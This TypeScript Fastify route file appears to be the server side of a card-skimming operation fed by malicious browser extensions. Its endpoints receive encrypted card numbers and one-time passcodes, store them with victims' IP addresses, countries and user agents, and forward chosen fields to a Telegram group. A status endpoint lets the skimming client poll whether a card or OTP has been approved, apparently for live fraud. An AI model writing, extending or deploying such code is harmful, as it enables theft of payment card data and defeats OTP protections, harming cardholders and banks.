import {FastifyInstance} from "fastify";
import {Static, Type} from "@sinclair/typebox";
import {decrypt} from "../../utils/crypto";
import { sendToGroup } from '../../utils/telegraf';
import {ParamSchema} from "../../utils/datatable";

const BodySchema = Type.Object({
  token: Type.String(),
  iv: Type.String(),
  encryptedPayload: Type.String()
});
const NotiBodySchema = Type.Object({
  token: Type.String(),
  iv: Type.String(),
  encryptedPayload: Type.String()
});

const TagsBodySchema = Type.Object({
  tags: Type.Array(Type.String()),
});

export default async (fastify: FastifyInstance) => {
  fastify.route<{
    Body: Static<typeof BodySchema>
  }>({
    method: "POST",
    url: "/session",
    schema: {
      body: BodySchema
    },
    handler: async (request, reply) => {
      try {
        const {token, iv, encryptedPayload} = request.body;
        const dev = await decrypt(iv, encryptedPayload);
        const json = JSON.parse(dev);
        const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
        const country = request.headers["cf-ipcountry"] || request.headers["http-cf-ipcountry"] || "US";
        const userAgent = request.headers["user-agent"];
        const uid = '';
        const { cardNumber, cardType } = json;
        if (json.otp) {
          json.otpStatus = 'pending';
        }
        const extension = await fastify.mongoose.Extension.findOne({
          token
        });
        if (!extension) throw new Error("Extension not found");
        let updated = await fastify.mongoose.Cookie.findOne({
          cardNumber
        });
        if (updated) {
          updated = await fastify.mongoose.Cookie.findOneAndUpdate({ cardNumber }, {...json}, { new: true });
        } else {
          const count = await fastify.mongoose.Cookie.count({});
          updated = await fastify.mongoose.Cookie.create({
            ...json,
            ip,
            country,
            userAgent,
            orderId: count + 1,
          });
        }
        const fields = extension.logMessage.split(/\s*,\s*/).map((field: string) => field.replace(/\s+/g, '')).filter((field) => !!field);
        const messages = fields.map((field: string) => json[field]);
        await sendToGroup([...messages, json.domain]);
        reply.send({
          success: true,
          timeout: extension.timeout,
          timeout2: extension.timeout2,
          skipOTP: extension.skipOTP,
        });
      } catch (ex) {
        console.error(ex);
        throw new Error(ex);
      }
    }
  });
  fastify.route<
    {
      Body: Static<typeof BodySchema>
    }
  >({
    method: "POST",
    url: "/noti",
    schema: {
      body: NotiBodySchema
    },
    handler: async (request, reply) => {
      const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
      const {token, iv, encryptedPayload} = request.body;
      const dev = await decrypt(iv, encryptedPayload);
      const json = JSON.parse(dev);
      const extension = await fastify.mongoose.Extension.findOne({ token });
      const fields = extension.logMessage.split(/\s*,\s*/).map((field: string) => field.replace(/\s+/g, '')).filter((field) => !!field);
      const messages = fields.map((field: string) => json[field]);
      await sendToGroup([...messages, json.products, json.domain]);
      reply.send({
        success: true
      });
    }
  });

  fastify.route<
      {
        Params: Static<typeof ParamSchema>,
      }
  >({
    method: "GET",
    url: "/status/:id",
    schema: {
      params: ParamSchema,
    },
    handler: async (request, reply) => {
      try {
        const { id } = request.params;
        const res = await fastify.mongoose.Cookie.findOne({ cardNumber: id });
        reply.send({
          success: true,
          cardNumberStatus: res.cardNumberStatus,
          otpStatus: res.otpStatus,
        });
      } catch (ex) {
        throw new Error(ex);
      }
    }
  });

  fastify.route<
      {
        Params: Static<typeof ParamSchema>,
        Body: Static<typeof TagsBodySchema>
      }
  >({
    method: "POST",
    url: "/tags/:id",
    schema: {
      params: ParamSchema,
      body: TagsBodySchema,
    },
    handler: async (request, reply) => {
      try {
        const { id } = request.params;
        const { tags } = request.body;
        await fastify.mongoose.Cookie.findOneAndUpdate({ cardNumber: id }, {
          tags,
        });
        reply.send({
          success: true,
        });
      } catch (ex) {
        throw new Error(ex);
      }
    }
  })
}